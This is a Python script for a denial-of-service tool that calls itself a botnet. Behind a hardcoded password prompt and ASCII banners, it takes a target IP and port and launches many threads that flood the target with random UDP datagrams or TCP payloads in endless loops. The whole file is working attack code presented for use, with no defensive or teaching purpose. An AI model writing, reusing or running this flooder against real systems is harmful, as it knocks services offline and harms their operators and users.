import signal
import time
import socket
import random
import threading
import sys
import os
from os import system, name

os.system("figlet DDOS ATTACK -f slant")

os.system("clear")
for i in range(1):
    pwd = input("""\033[91m
█░█░█ █▀▀ █░░ █▀▀ █▀█ █▀▄▀█ █▀▀   ▀█▀ █▀█
▀▄▀▄▀ ██▄ █▄▄ █▄▄ █▄█ █░▀░█ ██▄   ░█░ █▄█

█░░ █▀█ █▀▀ █ █▄░█   █▄▄ █▀█ ▀█▀ █▄░█ █▀▀ ▀█▀
█▄▄ █▄█ █▄█ █ █░▀█   █▄█ █▄█ ░█░ █░▀█ ██▄ ░█░

Please press enter""")
print("\033[0m")

os.system("clear")
print("""

██╗░░░██╗░░░░░░██████╗░░█████╗░████████╗███╗░░██╗
██║░░░██║░░░░░░██╔══██╗██╔══██╗╚══██╔══╝████╗░██║
╚██╗░██╔╝█████╗██████╦╝██║░░██║░░░██║░░░██╔██╗██║
░╚████╔╝░╚════╝██╔══██╗██║░░██║░░░██║░░░██║╚████║
░░╚██╔╝░░░░░░░░██████╦╝╚█████╔╝░░░██║░░░██║░╚███║
░░░╚═╝░░░░░░░░░╚═════╝░░╚════╝░░░░╚═╝░░░╚═╝░░╚══╝""")
password ='BotNet'

for i in range(3):
    pwd = input("[>>>] Enter Account : ")
    j=3
    if(pwd==password):
        time.sleep(4)
        print("[>>] Wait A Moment!!! ")
        break
    else:
        time.sleep(5)
        print("[>] Wrong Account!!! ")
        continue
time.sleep(5)
print("[>] Login Successful")
time.sleep(5)

os.system("clear")
print("""
██╗░░░██╗░░░░░░██████╗░░█████╗░████████╗███╗░░██╗
██║░░░██║░░░░░░██╔══██╗██╔══██╗╚══██╔══╝████╗░██║
╚██╗░██╔╝█████╗██████╦╝██║░░██║░░░██║░░░██╔██╗██║
░╚████╔╝░╚════╝██╔══██╗██║░░██║░░░██║░░░██║╚████║
░░╚██╔╝░░░░░░░░██████╦╝╚█████╔╝░░░██║░░░██║░╚███║
░░░╚═╝░░░░░░░░░╚═════╝░░╚════╝░░░░╚═╝░░░╚═╝░░╚══╝""")

ip = str(input("[ ====> ] Target IP : "))
port = int(input("[ ====> ] Target Port : "))
choice = str(input("[ ====> ] Methods UDP|TCP : "))
times = int(input("[ ====> ] Times :"))
threads = int(input("[ ====> ] Threads :"))
def run():
	data = random._urandom(1800)
	i = random.choice(("[WARNING]","[WARNING]","[WARNING]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" BOTNET ATTACK IP %s AND PORT %s"%(ip,port))
		except:
			s.close()
			print("[!] SERVER DOWN!!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[=>]","[<=]","[=>]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" BOTNET ATTACK IP %s AND PORT %s"%(ip ,port))
		except:
			s.close()
			print("[*] SERVER DOWN!!!")
			
def run3():
	data = random._urandom(1180)
	i = random.choice(("[WARNING]","[WARNING]","[WARNING]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" BOTNET ATTACK IP %s AND PORT %s"%(ip,port))
		except:
			s.close()
			print("[!] SERVER DOWN!!!")
						
def run4():
	data = random._urandom(16)
	i = random.choice(("[WARNING]","[WARNING]","[WARNING]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" BOTNET ATTACK IP %s AND PORT %s"%(ip,port))
		except:
			s.close()
			print("[!] SERVER DOWN!!!")
		
						
for y in range(threads):
	if choice == 'UDP':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run3)
		th.start()
	else:
		th = threading.Thread(target = run4)
		th.start()	
	if choice == 'TCP':
		th = threading.Thread(target = run2)
		th.start()	

def new():
	for y in range(threads):
		if choice == 'UDP':
			th = threading.Thread(target = run)
			th.start()
			th = threading.Thread(target = run3)
			th.start()
		else:
			th = threading.Thread(target = run4)
			th.start()
		if choice == 'TCP':
			th = threading.Thread(target = run3)
			th.start()

def whereuwere():
    print("Aww man, I'm so sorry, but I can't remember if u were in TCP or UDP")
    print("Put 1 for UDP and 2 for TCP")
    whereman = str(input(" 1 or 2 >:("))
    if whereman == '1':
        run()
    else:
        run2()

def clear():
	# for windows
    if name == 'nt':
        _ = system('cls')

    # for mac and linux(here, os.name is 'posix')
    else:
        _ = system('clear')

def byebye():
	clear()
	os.system("figlet Youre Leaving Sir -f slant")
	sys.exit(130)

def exit_gracefully(signum, frame):
    # restore the original signal handler as otherwise evil things will happen
    # in raw_input when CTRL+C is pressed, and our signal handler is not re-entrant
    signal.signal(signal.SIGINT, original_sigint)

    try:
        exitc = str(input(" Kenapa Close Lagi <3 ?:"))
        if exitc == 'y':

            byebye()

    except KeyboardInterrupt:
        print("Ok ok, quitting")
        byebye()

    # restore the exit gracefully handler here
    signal.signal(signal.SIGINT, exit_gracefully)

if __name__ == '__main__':
    original_sigint = signal.getsignal(signal.SIGINT)
    signal.signal(signal.SIGINT, exit_gracefully)
    
if os.name != "nt":
    exit()
